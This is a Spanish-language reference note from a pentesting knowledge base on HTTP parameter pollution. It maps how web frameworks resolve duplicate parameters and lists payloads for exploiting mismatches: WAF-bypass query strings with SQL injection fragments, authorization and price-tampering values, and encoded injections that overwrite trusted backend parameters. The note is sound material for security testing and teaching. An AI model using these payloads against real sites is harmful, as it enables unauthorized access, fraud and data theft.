---
tipo: meta
aliases:
  - resolución de parámetros duplicados
  - HPP payloads
  - parameter pollution table
tags:
  - meta/referencia
  - dominio/web
---

# HPP - matriz de referencia

> [!info] Referencia pura, no un zettel
> Cómo resuelve cada tecnología un parámetro duplicado, y cómo explotar la discrepancia. El criterio está en las dos notas de `600-tradecraft/`; el modelo, en [[MOC - HTTP parameter pollution]].

Dominio compacto: una matriz cubre la tabla de resolución, la codificación y los escenarios.

## 1. La tabla de resolución — el corazón del dominio

`?x=1&x=2` da, según la tecnología:

| Tecnología / marco | Resultado | Regla |
|---|---|---|
| PHP (Apache) | `2` | Último |
| Apache Tomcat / JSP | `1` | Primero |
| ASP.NET / IIS | `1,2` | Concatena con coma |
| ASP clásico | `1,2` | Concatena |
| Python Flask (`request.args.get`) | `1` | Primero |
| Python Django (`GET['x']`) | `2` | Último |
| Node Express (`req.query.x`) | `['1','2']` | Lista |
| Ruby on Rails | `2` | Último |
| Perl CGI | `1` | Primero |
| Go (`r.FormValue`) | `1` | Primero |
| Spring | depende | Suele el primero |

La discrepancia se explota cuando **el filtro/WAF usa una regla y la aplicación otra**. Confirmar cada capa por separado.

## 2. Confirmar la resolución de cada capa

Probar y observar qué valor usa la aplicación:

```
?debug=1&debug=2        → ¿la respuesta refleja 1, 2, o 1,2?
?rol=a&rol=b            → ¿qué rol aplica?
```

Y qué valida el WAF: mandar un valor malicioso en una posición y ver si bloquea:

```
?x=' OR '1'='1&x=inocuo    → ¿el WAF bloquea? (validó el primero)
?x=inocuo&x=' OR '1'='1    → ¿pasa? (validó el primero, app usa el último)
```

## 3. Codificación del separador

El componente que separa parámetros también discrepa según la codificación:

| Separador | Notas |
|---|---|
| `&` | El estándar |
| `%26` | `&` codificado — a veces una capa lo decodifica y otra no |
| `;` | Separador alternativo en algunos parsers (obsoleto pero vivo) |
| `%3B` | `;` codificado |
| `&amp;` | En contextos HTML |

Probar cada uno multiplica las combinaciones para encontrar la discrepancia.

## 4. Bypass de filtro / WAF

Ver [[HPP - bypass por discrepancia de parseo]]. Poner el inocente donde valida el WAF, el malicioso donde usa la app.

Según la tabla (WAF valida el primero, PHP usa el último):
```
?q=hola&q=' UNION SELECT ...
```

Según (WAF valida el último, Tomcat usa el primero):
```
?q=' UNION SELECT ...&q=hola
```

Contra concatenación (ASP.NET da `1,2`), partir el payload:
```
?q=' UNION&q=SELECT     → la app ve "' UNION,SELECT" — a veces útil, a veces no
```

## 5. Bypass de lógica y autorización

```
?admin=false&admin=true
?precio=100&precio=1
?monto=10&monto=10000
?paso=1&paso=3
```

Cuando la validación y el uso discrepan, el segundo valor gana en el uso.

## 6. Inyección de parámetros — segundo orden

Ver [[HPP - inyección de parámetros]]. Inyectar un `&` en un valor que la app reenvía:

```
?user=juan%26admin=true
?url=/pagina%26internal=1
?id=5%26role=admin
```

La app construye `http://backend/...?id=5&role=admin` con el parámetro inyectado.

Del lado del cliente, inyectar en un enlace generado:
```
?redirect=/x%26extra=payload   → <a href="/x&extra=payload">
```

## 7. Sobrescribir un parámetro que ya está

Si la app pone su propio parámetro después del tuyo, y el backend toma el último:
```
la app arma: /api?id=TU_INPUT&trusted=false
inyectás:    id=5%26trusted=true%23   (el # comenta el trusted=false original)
resultado:   /api?id=5&trusted=true#&trusted=false
```

El `#` o un parámetro repetido que gane en la resolución del backend sobrescribe el valor de confianza que la app agregó.

## 8. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| Ambas capas dan el mismo valor | Sin discrepancia; HPP no aporta acá |
| El WAF bloquea en las dos posiciones | Valida después de resolver, o mira todos los valores |
| El `&` inyectado se codifica en la URL construida | La app codifica: mitigado |
| El duplicado se rechaza | El borde normaliza; no hay dominio |
| El backend ignora el parámetro inyectado | No espera ese param; probar sobrescribir uno que sí usa |
| `%26` no separa | Esa capa no lo decodifica; probar `&` literal o `;` |

## Relacionadas

[[MOC - HTTP parameter pollution]] · [[HPP - bypass por discrepancia de parseo]] · [[HPP - inyección de parámetros]] · [[Request smuggling - matriz de sondeo]]
